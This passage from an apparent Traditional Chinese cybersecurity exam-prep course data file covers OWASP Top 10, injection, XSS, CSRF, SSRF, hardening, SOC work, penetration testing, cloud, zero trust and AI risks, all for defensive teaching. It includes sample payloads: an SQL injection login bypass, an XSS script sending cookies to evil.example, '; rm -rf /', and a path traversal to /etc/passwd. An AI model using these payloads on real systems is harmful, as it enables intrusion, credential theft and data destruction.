  <li><b>供應鏈攻擊</b>：入侵軟體廠商或更新機制，讓惡意程式隨正常更新散布到客戶（例：SolarWinds、3CX）。防範：軟體物料清單（<b>SBOM</b>）、程式碼簽章驗證、供應商資安要求。</li>
  <li><b>零時差攻擊</b>：利用尚未有修補程式的漏洞。</li>
  <li><b>內部威脅</b>：心懷不滿或被收買的員工、疏忽的員工。</li>
</ul>
<h3>洛克希德馬丁網路攻擊鏈（Cyber Kill Chain）</h3>
<div class="flow">
  <div><b>偵察</b><span>Reconnaissance</span></div>
  <div><b>武器化</b><span>Weaponization</span></div>
  <div><b>遞送</b><span>Delivery</span></div>
  <div><b>漏洞利用</b><span>Exploitation</span></div>
  <div><b>安裝</b><span>Installation</span></div>
  <div><b>命令與控制</b><span>C2</span></div>
  <div><b>採取行動</b><span>Actions on Objectives</span></div>
</div>
<p>防禦方只要在<strong>任何一個環節</strong>阻斷，就能中止攻擊，越早越好。</p>
<div class="box memo"><b class="t">記憶口訣</b>「<b>偵・武・遞・利・安・控・行</b>」</div>
<h3>MITRE ATT&CK</h3>
<p>依真實攻擊整理的<strong>戰術（Tactics，攻擊目的）</strong>與<strong>技術（Techniques，達成方法）</strong>知識庫，例如初始存取、執行、持久化、權限提升、防禦規避、憑證存取、探索、橫向移動、蒐集、命令與控制、資料外洩、衝擊。常用於威脅偵測規則設計與紅藍隊演練。</p>
<h3>威脅行為者類型</h3>
<ul>
  <li><b>腳本小子（Script Kiddie）</b>：技術低，使用現成工具。</li>
  <li><b>駭客行動主義者（Hacktivist）</b>：為政治或社會訴求。</li>
  <li><b>組織犯罪集團</b>：為經濟利益（勒索、詐騙）。</li>
  <li><b>國家級行為者</b>：資源最豐富，執行 APT。</li>
  <li><b>白帽／黑帽／灰帽</b>：授權合法測試／惡意攻擊／介於兩者之間。</li>
</ul>` }
  ],
  keypoints: [
    '病毒需宿主與執行；蠕蟲自我擴散；木馬偽裝不自我複製',
    'Rootkit 高權限且隱匿；殭屍網路由 C2 控制',
    '勒索軟體雙重勒索：加密 + 外洩威脅；離線備份是關鍵',
    'Smurf 用廣播放大 ICMP；放大攻擊利用 DNS/NTP 小請求大回應',
    'DNS 快取毒害 → DNSSEC；ARP 欺騙 → DAI',
    'APT 長期潛伏、針對特定目標；供應鏈攻擊用 SBOM 與簽章驗證',
    'Kill Chain：偵武遞利安控行'
  ]
},
{
  id: 'c12', subject: 2, minutes: 45,
  title: '網頁應用程式安全',
  summary: 'OWASP Top 10、SQL 注入、XSS、CSRF、SSRF 的原理與防禦，以及安全軟體開發生命週期。',
  sections: [
    { id: 'owasp', title: 'OWASP Top 10（2021）', html: `
<p>OWASP（開放式 Web 應用程式安全計畫）定期公布 Web 應用最關鍵的十大風險，是網頁安全最重要的參考。</p>
<div class="table-wrap"><table>
<tr><th>#</th><th>風險</th><th>重點</th></tr>
<tr><td>A01</td><td><b>權限控制失效</b> Broken Access Control</td><td>越權存取他人資料（改網址 id=123 → 124）、IDOR</td></tr>
<tr><td>A02</td><td><b>加密機制失效</b> Cryptographic Failures</td><td>明文傳輸、弱加密、未加密儲存敏感資料</td></tr>
<tr><td>A03</td><td><b>注入攻擊</b> Injection</td><td>SQL、OS 命令、LDAP 注入，<strong>2021 版 XSS 併入此類</strong></td></tr>
<tr><td>A04</td><td>不安全設計 Insecure Design</td><td>設計階段就缺乏安全考量，需威脅建模</td></tr>
<tr><td>A05</td><td>安全設定缺陷 Security Misconfiguration</td><td>預設帳密、顯示詳細錯誤訊息、開啟目錄列表</td></tr>
<tr><td>A06</td><td>危險或過舊的元件</td><td>使用有已知漏洞的套件（如 Log4Shell）</td></tr>
<tr><td>A07</td><td>識別與驗證失效</td><td>弱密碼、無 MFA、Session 管理不當</td></tr>
<tr><td>A08</td><td>軟體及資料完整性失效</td><td>未驗證的更新、不安全的反序列化、CI/CD 遭竄改</td></tr>
<tr><td>A09</td><td>安全記錄及監控失效</td><td>沒有日誌或沒人看告警，入侵難以發現</td></tr>
<tr><td>A10</td><td><b>伺服器端請求偽造 SSRF</b></td><td>讓伺服器代替攻擊者對內部系統發請求</td></tr>
</table></div>
<div class="box tip"><b class="t">補充</b>OWASP 於 2025 年發布新版 Top 10 草案／正式版，排名有調整（例如將供應鏈相關風險納入），但上述 2021 版的概念仍是考試基礎，兩者核心觀念相通。</div>` },
    { id: 'sqli', title: 'SQL 注入（SQL Injection）', html: `
<p>當程式把使用者輸入<strong>直接拼接</strong>進 SQL 語句時，攻擊者可改變查詢邏輯。</p>
<pre class="out">// 危險寫法：直接拼接字串
sql = "SELECT * FROM users WHERE name='" + user + "' AND pw='" + pw + "'"

// 攻擊者在帳號輸入：  ' OR '1'='1' --
SELECT * FROM users WHERE name='' OR '1'='1' --' AND pw='...'
// '1'='1' 永遠成立，-- 之後被註解，不需密碼即可登入</pre>
<h3>類型</h3>
<ul>
  <li><b>錯誤型（Error-based）</b>：利用資料庫錯誤訊息洩漏資訊。</li>
  <li><b>聯集型（UNION-based）</b>：用 UNION 合併查詢取出其他資料表。</li>
  <li><b>盲注（Blind）</b>：沒有直接輸出，透過真假回應（Boolean）或延遲時間（Time-based）推測。</li>
</ul>
<h3>防禦</h3>
<ol>
  <li><b>參數化查詢（Prepared Statement）</b>——<strong>最有效</strong>，讓輸入只被當作資料而非指令。</li>
  <li>使用 ORM、預存程序（需避免內部再拼接）。</li>
  <li><b>輸入驗證</b>（白名單）與特殊字元處理。</li>
  <li>資料庫帳號<b>最小權限</b>，不用 sa/root 連線。</li>
  <li>不對使用者顯示詳細錯誤訊息；部署 <b>WAF</b> 作為額外防線。</li>
</ol>
<pre class="out">// 安全寫法：參數化查詢
db.query("SELECT * FROM users WHERE name = ? AND pw_hash = ?", [user, hash])</pre>` },
    { id: 'xss', title: '跨站腳本（XSS）', html: `
<p>攻擊者把惡意 JavaScript 注入網頁，<strong>在其他使用者的瀏覽器中執行</strong>，可竊取 Cookie、偽造操作、置換畫面。</p>
<div class="table-wrap"><table>
<tr><th>類型</th><th>說明</th></tr>
<tr><td><b>反射型 Reflected</b></td><td>惡意腳本在網址參數中，伺服器直接回應到頁面；需誘騙受害者點連結</td></tr>
<tr><td><b>儲存型 Stored</b></td><td>惡意腳本被存進資料庫（如留言板），所有瀏覽者都受害——<strong>危害最大</strong></td></tr>
<tr><td><b>DOM 型</b></td><td>前端 JavaScript 不當處理資料（如 innerHTML），不經過伺服器</td></tr>
</table></div>
<pre class="out">留言內容：&lt;script&gt;fetch('https://evil.example/?c='+document.cookie)&lt;/script&gt;</pre>
<h3>防禦</h3>
<ul>
  <li><b>輸出編碼（Output Encoding）</b>：將 <code>&lt; &gt; " ' &amp;</code> 轉為 HTML 實體——<strong>最核心</strong>。</li>
  <li>輸入驗證、使用框架的自動跳脫功能，避免 <code>innerHTML</code>、<code>eval</code>。</li>
  <li><b>CSP（內容安全政策）</b>：限制可執行的腳本來源。</li>
  <li>Cookie 設定 <b>HttpOnly</b>：JavaScript 無法讀取 Cookie。</li>
</ul>` },
    { id: 'csrf', title: 'CSRF、SSRF 與其他漏洞', html: `
<h3>跨站請求偽造（CSRF）</h3>
<p>受害者<strong>已登入</strong>某網站時，被誘導瀏覽惡意頁面，該頁面自動送出請求（如轉帳），瀏覽器會<strong>自動帶上受害者的 Cookie</strong>，伺服器誤以為是本人操作。</p>
<p><b>防禦</b>：<strong>Anti-CSRF Token</strong>（隨機權杖）、Cookie 設定 <b>SameSite</b>、重要操作再次驗證（輸入密碼／OTP）、檢查 Origin/Referer。</p>
<div class="box warn"><b class="t">XSS vs. CSRF</b>XSS 是「網站信任了惡意輸入」，在受害者瀏覽器<b>執行攻擊者的腳本</b>；CSRF 是「網站信任了使用者的瀏覽器」，<b>冒用受害者身分送出請求</b>。</div>
<h3>伺服器端請求偽造（SSRF）</h3>
<p>攻擊者讓伺服器去存取它本來能連、但外部連不到的資源，例如雲端中繼資料 <code>http://169.254.169.254/</code> 取得雲端憑證。防禦：目的地白名單、阻擋內部 IP、IMDSv2。</p>
<h3>其他常見漏洞</h3>
<ul>
  <li><b>命令注入</b>：輸入被帶入系統指令執行（如 <code>; rm -rf /</code>）。</li>
  <li><b>目錄穿越（Path Traversal）</b>：用 <code>../../etc/passwd</code> 讀取任意檔案。</li>
  <li><b>檔案上傳漏洞</b>：上傳 WebShell 取得伺服器控制權；需限制副檔名、檢查內容、存放於不可執行目錄。</li>
  <li><b>IDOR（不安全的直接物件參考）</b>：改變參數就能看到他人資料，需伺服器端檢查授權。</li>
  <li><b>緩衝區溢位（Buffer Overflow）</b>：寫入資料超過緩衝區長度，覆蓋記憶體甚至執行任意程式碼；防禦：邊界檢查、ASLR、DEP/NX、Stack Canary、使用記憶體安全語言。</li>
  <li><b>競爭條件（Race Condition / TOCTOU）</b>：檢查與使用之間的時間差被利用。</li>
  <li><b>點擊劫持（Clickjacking）</b>：用透明 iframe 誘騙點擊；防禦：<code>X-Frame-Options</code> 或 CSP <code>frame-ancestors</code>。</li>
</ul>` },
    { id: 'sdlc', title: '安全軟體開發（SSDLC）', html: `
<p>越早在開發流程中處理安全問題，修補成本越低——這就是 <b>Shift Left（左移）</b>。</p>
<div class="table-wrap"><table>
<tr><th>階段</th><th>安全活動</th></tr>
<tr><td>需求</td><td>定義安全需求、法規要求、資料分級</td></tr>
<tr><td>設計</td><td><b>威脅建模</b>（如 STRIDE）、安全架構審查</td></tr>
<tr><td>開發</td><td>安全程式撰寫規範、<b>程式碼審查</b>、<b>SAST</b>、套件掃描（SCA）</td></tr>
<tr><td>測試</td><td><b>DAST</b>、滲透測試、模糊測試（Fuzzing）</td></tr>
<tr><td>部署</td><td>安全組態、秘密管理（不把密碼寫在程式裡）</td></tr>
<tr><td>維運</td><td>弱點管理、修補、監控、事件應變</td></tr>
</table></div>
<ul>
  <li><b>SAST（靜態分析）</b>：不執行程式，分析<strong>原始碼</strong>，屬白箱。</li>
  <li><b>DAST（動態分析）</b>：對<strong>執行中的應用</strong>從外部測試，屬黑箱。</li>
  <li><b>IAST</b>：在執行環境中植入代理，結合兩者。</li>
  <li><b>SCA</b>：分析第三方開源套件的已知漏洞與授權。</li>
  <li><b>DevSecOps</b>：把安全自動化整合進 CI/CD 流程。</li>
</ul>
<h3>STRIDE 威脅模型</h3>
<div class="table-wrap"><table>
<tr><th>威脅</th><th>違反的屬性</th></tr>
<tr><td><b>S</b>poofing 偽冒</td><td>真確性（鑑別）</td></tr>
<tr><td><b>T</b>ampering 竄改</td><td>完整性</td></tr>
<tr><td><b>R</b>epudiation 否認</td><td>不可否認性</td></tr>
<tr><td><b>I</b>nformation Disclosure 資訊洩漏</td><td>機密性</td></tr>
<tr><td><b>D</b>enial of Service 阻斷服務</td><td>可用性</td></tr>
<tr><td><b>E</b>levation of Privilege 權限提升</td><td>授權</td></tr>
</table></div>
<h3>安全 HTTP 標頭</h3>
<p><code>Content-Security-Policy</code>、<code>Strict-Transport-Security</code>、<code>X-Content-Type-Options: nosniff</code>、<code>X-Frame-Options</code>、<code>Referrer-Policy</code>；Cookie 屬性 <code>Secure</code>、<code>HttpOnly</code>、<code>SameSite</code>。</p>` }
  ],
  keypoints: [
    'OWASP 2021 第一名：權限控制失效；XSS 併入 A03 注入',
    'SQL 注入最有效防禦：參數化查詢',
    'XSS 防禦：輸出編碼、CSP、HttpOnly；儲存型 XSS 危害最大',
    'CSRF 冒用已登入身分；防禦：Anti-CSRF Token、SameSite',
    'SSRF 讓伺服器存取內部資源（雲端中繼資料）',
    'SAST 白箱看原始碼；DAST 黑箱測執行中系統',
    'STRIDE：偽冒、竄改、否認、洩漏、阻斷、提權'
  ]
},
{
  id: 'c13', subject: 2, minutes: 40,
  title: '系統、端點與行動裝置安全',
  summary: '作業系統強化、修補管理、端點防護（防毒／EDR）、弱點管理與 CVE/CVSS、行動裝置與郵件安全。',
  sections: [
    { id: 'harden', title: '系統強化（Hardening）', html: `
<p>系統強化是<strong>減少攻擊面</strong>：把用不到的都關掉、把預設值改安全。</p>
<ul>
  <li>移除不必要的軟體、服務、帳號與開放埠。</li>
  <li><b>修改預設帳號與密碼</b>（如 admin/admin），停用 Guest。</li>
  <li>套用<b>安全組態基準</b>：政府組態基準 <b>GCB</b>、CIS Benchmarks。</li>
  <li>啟用主機防火牆、磁碟加密（BitLocker、FileVault、LUKS）。</li>
  <li>啟用並集中保存<b>稽核日誌</b>，校正 <b>NTP 時間</b>以便事件關聯。</li>
  <li>日常使用一般帳號，需要時才提升權限（UAC、sudo）。</li>
  <li><b>應用程式白名單</b>：只允許核准的程式執行，比黑名單更安全。</li>
  <li><b>安全開機（Secure Boot）</b>與 <b>TPM</b>：確保開機流程未遭竄改，TPM 可安全保存金鑰。</li>
</ul>
<h3>Linux／Windows 基本觀念</h3>
<ul>
  <li>Linux 權限 <code>rwx</code>（讀 4、寫 2、執行 1），<code>chmod 750</code> = 擁有者 rwx、群組 r-x、其他無權限。密碼雜湊存在 <code>/etc/shadow</code>（僅 root 可讀），<code>/etc/passwd</code> 存帳號資訊。</li>
  <li>Windows 事件檢視器：安全性日誌事件 <b>4624 登入成功、4625 登入失敗</b>、4720 建立帳號。</li>
</ul>` },
    { id: 'patch', title: '修補與弱點管理', html: `
<div class="flow">
  <div><b>資產盤點</b><span>知道有哪些系統</span></div>
  <div><b>弱點掃描</b><span>找出已知漏洞</span></div>
  <div><b>風險評估</b><span>CVSS + 資產重要性</span></div>
  <div><b>測試修補</b><span>先在測試環境驗證</span></div>
  <div><b>部署修補</b><span>依變更管理程序</span></div>
  <div><b>驗證</b><span>再次掃描確認</span></div>
</div>
<ul>
  <li><b>CVE</b>：通用漏洞披露，每個公開漏洞的唯一編號（如 CVE-2021-44228 Log4Shell）。</li>
  <li><b>CVSS</b>：通用漏洞評分系統，0～10 分：<b>無 0、低 0.1–3.9、中 4.0–6.9、高 7.0–8.9、嚴重 9.0–10.0</b>。</li>
  <li><b>CWE</b>：弱點的<strong>類型</strong>分類（如 CWE-79 XSS、CWE-89 SQL 注入）。</li>
  <li><b>KEV</b>：美國 CISA「已知遭利用漏洞」清單，應優先修補。</li>
  <li><b>虛擬修補（Virtual Patching）</b>：無法立即更新時，用 WAF/IPS 規則暫時阻擋攻擊。</li>
</ul>
<div class="box warn"><b class="t">變更管理</b>修補、組態變更都應經過<b>申請 → 評估 → 核准 → 測試 → 實施 → 檢討</b>，並準備回復計畫（Rollback），避免修補造成服務中斷。</div>` },
    { id: 'endpoint', title: '端點防護', html: `
<div class="table-wrap"><table>
<tr><th>技術</th><th>說明</th></tr>
<tr><td><b>防毒軟體 AV</b></td><td>以<strong>特徵碼</strong>比對為主，加上啟發式分析；需持續更新病毒碼</td></tr>
<tr><td><b>EDR</b> 端點偵測與回應</td><td>持續記錄端點行為（行程、網路連線、檔案），偵測可疑活動並可<strong>遠端隔離、調查、回應</strong></td></tr>
<tr><td><b>XDR</b></td><td>整合端點、網路、郵件、雲端等多來源的偵測與回應</td></tr>
<tr><td><b>DLP</b> 資料外洩防護</td><td>偵測並阻止敏感資料透過郵件、USB、雲端外流</td></tr>
<tr><td><b>沙箱 Sandbox</b></td><td>在隔離環境執行可疑檔案觀察行為</td></tr>
<tr><td><b>HIDS / FIM</b></td><td>主機入侵偵測、檔案完整性監控（重要檔案被改即告警）</td></tr>
</table></div>
<h3>行動裝置安全</h3>
<ul>
  <li><b>MDM／UEM</b>：集中管理行動裝置，可強制密碼、加密、<strong>遠端抹除</strong>、應用程式管理。</li>
  <li><b>BYOD</b>（自帶裝置）：方便但增加風險，可用<b>容器化</b>區隔公私資料。</li>
  <li><b>越獄（Jailbreak, iOS）／Root（Android）</b>會破壞系統安全機制，應禁止接入公司資源。</li>
  <li><b>側載（Sideloading）</b>：從非官方商店安裝 App，風險高。</li>
</ul>
<h3>電子郵件安全</h3>
<div class="table-wrap"><table>
<tr><th>機制</th><th>作用</th></tr>
<tr><td><b>SPF</b></td><td>在 DNS 宣告哪些 IP <strong>有權代表網域寄信</strong></td></tr>
<tr><td><b>DKIM</b></td><td>以<strong>數位簽章</strong>確保郵件內容未被竄改、來自該網域</td></tr>
<tr><td><b>DMARC</b></td><td>結合 SPF 與 DKIM，宣告驗證失敗時的處理政策（none/quarantine/reject）並回報</td></tr>
<tr><td>S/MIME、PGP</td><td>端對端加密與簽章郵件內容</td></tr>
</table></div>
<div class="box tip"><b class="t">小提醒</b>SPF/DKIM/DMARC 能有效降低<b>偽冒寄件網域</b>的釣魚信，但無法阻擋使用相似網域（Typosquatting）的攻擊。</div>` },
    { id: 'virt', title: '虛擬化與容器', html: `
<ul>
  <li><b>Hypervisor</b>：Type 1（裸機型，如 VMware ESXi、Hyper-V）效能與安全較佳；Type 2（宿主型，如 VirtualBox）安裝在作業系統上。</li>
  <li><b>VM 逃逸（VM Escape）</b>：從虛擬機突破到宿主或其他 VM，是虛擬化最嚴重的威脅。</li>
  <li><b>VM 蔓延（VM Sprawl）</b>：VM 過多缺乏管理，未修補的 VM 成為漏洞。</li>
  <li><b>快照（Snapshot）</b>方便還原，但也可能保存敏感資料，需妥善管理。</li>
  <li><b>容器（Docker、Kubernetes）</b>：共用宿主核心，較 VM 輕量但隔離性較弱；應使用可信映像檔、掃描漏洞、不以 root 執行、限制資源。</li>
</ul>` }
  ],
  keypoints: [
    '系統強化：減少攻擊面、改預設帳密、套用 GCB/CIS 基準',
    'CVE 是漏洞編號、CWE 是弱點類型、CVSS 0～10 評分（9.0 以上為嚴重）',
    '修補需經變更管理與測試；無法修補時用虛擬修補',
    '防毒靠特徵碼；EDR 持續監控行為並可回應隔離',
    'MDM 可遠端抹除；越獄／Root 裝置應禁止接入',
    'SPF 授權寄件 IP、DKIM 簽章、DMARC 政策'
  ]
},
{
  id: 'c14', subject: 2, minutes: 40,
  title: '資安維運與監控',
  summary: '日誌管理與 SIEM、SOC 運作、弱點掃描與滲透測試、紅藍紫隊、威脅情資與資安健診。',
  sections: [
    { id: 'log', title: '日誌管理與 SIEM', html: `
<p>沒有日誌，就無法發現入侵、也無法調查事件。日誌管理重點：</p>
<ul>
  <li><b>集中收集</b>：送到獨立的日誌伺服器，避免攻擊者在主機上刪除痕跡。</li>
  <li><b>時間同步（NTP）</b>：所有設備時間一致，才能關聯不同來源事件。</li>
  <li><b>完整性保護</b>：唯讀、雜湊、WORM 儲存，防止竄改。</li>
  <li><b>保存期限</b>：依法規與政策（例如資安法要求一定期間的保存）。</li>
  <li>記錄 <b>誰（Who）、何時（When）、在哪（Where）、做了什麼（What）、結果（Result）</b>。</li>
</ul>
<h3>SIEM 安全資訊與事件管理</h3>
<p>SIEM 收集各種來源的日誌（防火牆、伺服器、AD、EDR…），進行<strong>正規化、關聯分析、告警、儀表板與報表</strong>。例如：「同一帳號 5 分鐘內登入失敗 20 次後成功，且來源 IP 在國外」→ 產生高風險告警。</p>
<ul>
  <li><b>SOAR</b>：安全協同、自動化與回應——用劇本（Playbook）自動處理告警，例如自動封鎖 IP、停用帳號。</li>
  <li><b>UEBA</b>：使用者與實體行為分析，用基準線偵測異常行為（內部威脅）。</li>
</ul>` },
    { id: 'soc', title: 'SOC 資安監控中心', html: `
<p><b>SOC</b> 負責 24×7 監控、分析、回應資安事件。常見分工：</p>
<ul>
  <li><b>Tier 1</b>：告警初步分類（Triage），排除誤報、升級可疑事件。</li>
  <li><b>Tier 2</b>：深入調查分析、事件回應。</li>
  <li><b>Tier 3</b>：威脅獵捕（Threat Hunting）、進階鑑識、規則調校。</li>
</ul>
<h3>常見指標</h3>
<ul>
  <li><b>MTTD</b>（平均偵測時間）：從入侵到發現的時間，越短越好。</li>
  <li><b>MTTR</b>（平均回應／復原時間）：從發現到處理完成的時間。</li>
  <li><b>告警疲勞</b>：誤報太多導致分析人員忽略真正威脅，需要持續調校規則。</li>
</ul>
<div class="box tip"><b class="t">威脅獵捕</b>不等告警，主動假設「我們已經被入侵了」，去日誌中尋找攻擊跡象，是主動式防禦。</div>` },
    { id: 'test', title: '弱點掃描 vs. 滲透測試', html: `
<div class="table-wrap"><table>
<tr><th></th><th>弱點掃描 Vulnerability Scan</th><th>滲透測試 Penetration Test</th></tr>
<tr><td>方式</td><td>自動化工具比對已知漏洞</td><td>人工為主，<strong>模擬真實攻擊並實際利用漏洞</strong></td></tr>
<tr><td>深度</td><td>廣而淺，可能有誤報</td><td>窄而深，驗證可利用性與衝擊</td></tr>
<tr><td>頻率</td><td>定期、頻繁（如每月／每季）</td><td>較少（如每年）或重大變更後</td></tr>
<tr><td>成本</td><td>低</td><td>高</td></tr>
<tr><td>工具</td><td>Nessus、OpenVAS、Qualys</td><td>Metasploit、Burp Suite、Nmap 等</td></tr>
</table></div>
<h3>滲透測試的知識程度</h3>
<ul>
  <li><b>黑箱</b>：測試者事先不知道任何內部資訊，模擬外部攻擊者。</li>
  <li><b>白箱</b>：提供完整資訊（架構、原始碼），測試最全面。</li>
  <li><b>灰箱</b>：提供部分資訊（如一般使用者帳號）。</li>
</ul>
<h3>滲透測試流程</h3>
<div class="flow">
  <div><b>規劃與授權</b><span>範圍、規則（RoE）、書面同意</span></div>
  <div><b>資訊蒐集</b><span>被動／主動偵察</span></div>
  <div><b>弱點分析</b><span>掃描、列舉</span></div>
  <div><b>漏洞利用</b><span>取得存取權</span></div>
  <div><b>後滲透</b><span>提權、橫向移動</span></div>
  <div><b>報告</b><span>發現、風險、修補建議</span></div>
</div>
<div class="box warn"><b class="t">鐵則</b>滲透測試<b>一定要事先取得書面授權</b>並明確界定範圍與時間；完成後要清除測試留下的帳號與工具。</div>
<ul>
  <li><b>被動偵察</b>：不直接接觸目標，例如查 WHOIS、搜尋引擎（Google Hacking）、社群網站（OSINT 開源情報）。</li>
  <li><b>主動偵察</b>：直接與目標互動，例如 <b>Nmap</b> 埠掃描、Ping 掃描、Banner Grabbing。</li>
</ul>` },
    { id: 'teams', title: '紅藍紫隊與資安演練', html: `
<div class="concepts">
  <div class="concept"><b>紅隊 Red Team</b><span>扮演攻擊者，以真實手法測試組織的偵測與回應能力，目標導向（如取得網域管理權）。</span></div>
  <div class="concept"><b>藍隊 Blue Team</b><span>防禦方，負責監控、偵測、回應與強化。</span></div>
  <div class="concept"><b>紫隊 Purple Team</b><span>紅藍協作，攻擊後立即分享手法，共同改善偵測規則。</span></div>
  <div class="concept"><b>白隊 White Team</b><span>裁判與規則制定者，監督演練進行。</span></div>
</div>
<ul>
  <li><b>漏洞獎勵計畫（Bug Bounty）</b>：邀請外部研究人員回報漏洞並給予獎勵，台灣有 TVN（台灣漏洞通報平台）等機制。</li>
  <li><b>負責任揭露（Responsible Disclosure）</b>：發現漏洞先通知廠商，給予修補時間再公開。</li>
  <li><b>攻防演練／社交工程演練／桌上演練</b>：檢驗人員與流程。</li>
</ul>
<h3>威脅情資（Threat Intelligence）</h3>
<ul>
  <li><b>IoC（入侵指標）</b>：已知惡意的 IP、網域、檔案雜湊、URL——可直接用來阻擋或比對。</li>
  <li><b>IoA（攻擊指標）</b>：攻擊行為模式，偏向偵測進行中的攻擊。</li>
  <li><b>TTP</b>：戰術、技術與程序，描述攻擊者「怎麼做」，最難改變、價值最高（金字塔頂端）。</li>
  <li>情資分享格式與協定：<b>STIX</b>（描述格式）、<b>TAXII</b>（傳輸協定）。</li>
  <li>情資層級：<b>戰略</b>（給高層的趨勢）、<b>戰術</b>（TTP）、<b>作業／技術</b>（IoC）。</li>
</ul>
<h3>資安健診</h3>
<p>政府資安法要求的「資安健診」通常包含：網路架構檢視、網路惡意活動檢視、使用者端電腦惡意活動檢視、伺服器主機惡意活動檢視、目錄伺服器設定檢視、防火牆設定檢視等。</p>` }
  ],
  keypoints: [
    '日誌要集中、時間同步、防竄改；SIEM 做關聯分析與告警',
    'SOAR 用劇本自動回應；UEBA 偵測異常行為',
    '弱掃自動廣而淺；滲透測試人工深入實際利用',
    '黑箱無資訊、白箱全資訊、灰箱部分資訊',
    '滲透測試前必須取得書面授權',
    '紅隊攻、藍隊守、紫隊協作；IoC 是惡意 IP/雜湊等指標',
    '被動偵察（OSINT、WHOIS）不接觸目標；Nmap 屬主動偵察'
  ]
},
{
  id: 'c15', subject: 2, minutes: 40,
  title: '雲端、零信任與新興科技安全',
  summary: '雲端服務模式與共同責任、零信任架構、IoT/OT 安全、AI 安全與生成式 AI 風險。',
  sections: [
    { id: 'cloud', title: '雲端服務模式與部署模式', html: `
<p>NIST 定義雲端五大特性：<b>隨需自助服務、廣泛網路存取、資源池化、快速彈性、可量測的服務</b>。</p>
<div class="table-wrap"><table>
<tr><th>服務模式</th><th>供應商提供</th><th>例子</th></tr>
<tr><td><b>IaaS</b> 基礎設施即服務</td><td>運算、儲存、網路（虛擬機）</td><td>AWS EC2、GCP Compute Engine</td></tr>
<tr><td><b>PaaS</b> 平台即服務</td><td>再加上作業系統、執行環境、中介軟體</td><td>Heroku、Google App Engine</td></tr>
<tr><td><b>SaaS</b> 軟體即服務</td><td>完整應用程式</td><td>Gmail、Microsoft 365、Salesforce</td></tr>
</table></div>
<p>部署模式：<b>公有雲</b>、<b>私有雲</b>、<b>社群雲</b>（同性質組織共用）、<b>混合雲</b>。</p>
<h3>共同責任模型（Shared Responsibility）</h3>
<div class="table-wrap"><table>
<tr><th>項目</th><th>IaaS</th><th>PaaS</th><th>SaaS</th></tr>
<tr><td><b>資料、帳號與存取管理</b></td><td>客戶</td><td>客戶</td><td><strong>客戶</strong></td></tr>
<tr><td>應用程式</td><td>客戶</td><td>客戶</td><td>供應商</td></tr>
<tr><td>作業系統、執行環境</td><td>客戶</td><td>供應商</td><td>供應商</td></tr>
<tr><td>虛擬化、硬體、實體機房</td><td>供應商</td><td>供應商</td><td>供應商</td></tr>
</table></div>
<div class="box exam"><b class="t">考點提示</b>不論哪種模式，<b>資料本身與使用者帳號權限永遠是客戶的責任</b>。從 IaaS → SaaS，客戶責任越來越少。最常見的雲端事故是<b>客戶設定錯誤</b>（例如儲存桶設為公開）。</div>
<h3>雲端安全工具</h3>
<ul>
  <li><b>CASB</b>（雲端存取安全代理）：可視化與管控員工使用的雲端服務，偵測<b>影子 IT</b>。</li>
  <li><b>CSPM</b>：持續檢查雲端組態錯誤。</li>
  <li><b>CWPP</b>：保護雲端工作負載（VM、容器）。</li>
  <li><b>KMS／HSM</b>：金鑰管理；<b>BYOK</b> 自帶金鑰。</li>
  <li>多租戶環境的資料隔離、資料主權（資料存放國家）、供應商鎖定與退場計畫。</li>
</ul>` },
    { id: 'zt', title: '零信任架構（Zero Trust）', html: `
<p>傳統「城堡護城河」模型假設內網是可信的；零信任則主張：<strong>永不信任，一律驗證（Never Trust, Always Verify）</strong>。</p>
<h3>核心原則（NIST SP 800-207）</h3>
<ul>
  <li>不因網路位置（內網）就給予信任。</li>
  <li>每一次存取請求都要依<b>身分、裝置狀態、情境</b>動態驗證與授權。</li>
  <li><b>最小權限</b>、逐次（Per-session）授權。</li>
  <li><b>假設已遭入侵（Assume Breach）</b>，持續監控並<b>微分段（Micro-segmentation）</b>限制橫向移動。</li>
</ul>
<h3>架構元件</h3>
<ul>
  <li><b>PDP（政策決策點）</b>：包含政策引擎（PE）與政策管理器（PA），決定是否允許存取。</li>
  <li><b>PEP（政策執行點）</b>：實際放行或阻擋連線。</li>
</ul>
<p>台灣政府推動零信任網路分三大核心機制：<b>身分鑑別、設備鑑別、信任推斷</b>。</p>
<h3>相關技術</h3>
<ul>
  <li><b>ZTNA</b>（零信任網路存取）：取代傳統 VPN，只連到被授權的應用而非整個網路。</li>
  <li><b>SASE</b>：將 SD-WAN 與 ZTNA、CASB、SWG、FWaaS 等安全功能整合為雲端服務。</li>
</ul>` },
    { id: 'iot', title: 'IoT 與 OT／工控安全', html: `
<h3>物聯網（IoT）常見問題</h3>
<ul>
  <li>出廠<b>預設密碼</b>且未更改（Mirai 殭屍網路即利用此點，以大量 IoT 裝置發動 DDoS）。</li>
  <li>韌體更新困難、加密不足、運算資源有限、裝置數量龐大難以盤點。</li>
  <li><b>防護</b>：變更預設密碼、更新韌體、<b>網路隔離（獨立 VLAN）</b>、關閉不必要服務（如 UPnP、Telnet）、選購有資安標章的產品（台灣 IoT 資安標章）。</li>
</ul>
<h3>營運技術（OT）與工業控制系統（ICS）</h3>
<ul>
  <li>OT 控制實體設備（電廠、水廠、工廠產線），常見系統：<b>SCADA</b>（監控與資料擷取）、<b>PLC</b>（可程式邏輯控制器）、HMI、DCS。</li>
  <li>IT 優先順序是 <b>C &gt; I &gt; A</b>；OT 則以<b>可用性與人身安全（Safety）優先</b>（A &gt; I &gt; C）——不能隨便重開機或停機修補。</li>
  <li>OT 系統生命週期長（數十年），常使用老舊作業系統、明文協定（Modbus）。</li>
  <li><b>防護</b>：IT/OT 網路區隔（Purdue 模型）、單向閘道（Data Diode）、白名單、嚴格管控 USB 與遠端維護。</li>
  <li>著名事件：<b>Stuxnet</b>（攻擊伊朗核設施離心機的 PLC）、烏克蘭電網攻擊。</li>
</ul>` },
    { id: 'ai', title: 'AI 與新興科技安全', html: `
<h3>AI 帶來的資安議題</h3>
<div class="table-wrap"><table>
<tr><th>風險</th><th>說明</th></tr>
<tr><td><b>提示注入 Prompt Injection</b></td><td>以精心設計的輸入（含隱藏在網頁、文件中的間接注入）讓大型語言模型（LLM）違反原本指令或洩漏資料</td></tr>
<tr><td><b>資料投毒 Data Poisoning</b></td><td>在訓練資料中摻入惡意樣本，使模型產生錯誤或埋入後門</td></tr>
<tr><td><b>對抗樣本 Adversarial Example</b></td><td>加入人眼難以察覺的擾動讓模型判斷錯誤（如讓自駕車誤判路標）</td></tr>
<tr><td><b>模型竊取／反推</b></td><td>大量查詢複製模型，或從模型推回訓練資料（成員推論攻擊）</td></tr>
